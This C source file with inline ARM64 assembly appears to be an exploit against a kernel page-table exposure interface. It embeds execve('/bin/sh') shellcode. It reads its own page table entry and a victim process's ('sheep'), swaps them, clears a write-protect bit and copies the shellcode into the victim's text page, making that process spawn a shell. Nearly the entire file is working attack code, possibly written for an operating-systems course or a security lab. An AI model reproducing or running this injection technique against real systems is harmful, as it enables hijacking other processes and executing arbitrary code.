#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "expose_pte.h"

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
	"mov  x14, #25135\n\t"
	"movk x14, #28265, lsl #16\n\t"
	"movk x14, #12079, lsl #0x20\n\t"
	"movk x14, #29487, lsl #0x30\n\t"
	"mov  x15, #104\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	/* execve(path='sp', argv=0, envp=0) */
	"mov  x0, sp\n\t"
	"mov  x1, xzr\n\t"
	"mov  x2, xzr\n\t"
	/* call execve() */
	"mov  x8, #221\n\t" // SYS_execve
	"svc 0");

int main (int argc, char* argv[]) {
    int i;
    void *loop;
    unsigned long pte_loop, pte_sheep_text;
    unsigned long *ptep_exploit;
    unsigned long *ptep_sheep;
    unsigned long sheep_text_va;
    int sheep_text_pte_index, loop_pte_index;

    // Check arguments
    if (argc != 3) {
        printf("Usage %s sheep_pid va\n", argv[0]);
        exit(-1);
    }

    sheep_text_va = (unsigned long)strtol(argv[2], NULL, 16);

    loop = mmap(NULL, 1 << 12, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (!loop) {
        printf("allocate error.\n");
        exit(-1);
    }
    // loop in the middle of the page
    for (i = 0; i < 1 << 10; i++)
        ((int*)loop)[i] = 0xd503201f;
    ((int*)loop)[511] = 0x17ffffff;              // branch to prev instruction

    // Expose loop's pte
    loop_pte_index = ((unsigned long)loop >> 12) % 512;
    ptep_exploit = expose_pte_single(getpid(), (unsigned long)loop);
    pte_loop = ptep_exploit[loop_pte_index];

    // Expose sheep's pte
    sheep_text_pte_index = (sheep_text_va >> 12) % 512;
    ptep_sheep = expose_pte_single(atoi(argv[1]), sheep_text_va);
    pte_sheep_text = ptep_sheep[sheep_text_pte_index];

    // change sheep's pte entry so it points to the loop page
    ptep_sheep[sheep_text_pte_index] = pte_loop;
    
    // inject the sheep's original text page with shellcode
    // bit 7 should be 0 for write access D5-2731
    ptep_exploit[loop_pte_index] = pte_sheep_text & 0xffffffffffffff7f;
    for (i = 0; i < 1 << 10; i++)
	((int*)loop)[i] = 0xd503201f;
    memcpy(loop + (1 << 12) - 44, &shellcode, 44);

    // make sheep run sc
    ptep_sheep[sheep_text_pte_index] = pte_sheep_text;

    // put back loop page in exploit's va space
    ptep_exploit[loop_pte_index] = pte_loop;

    return 0;
}
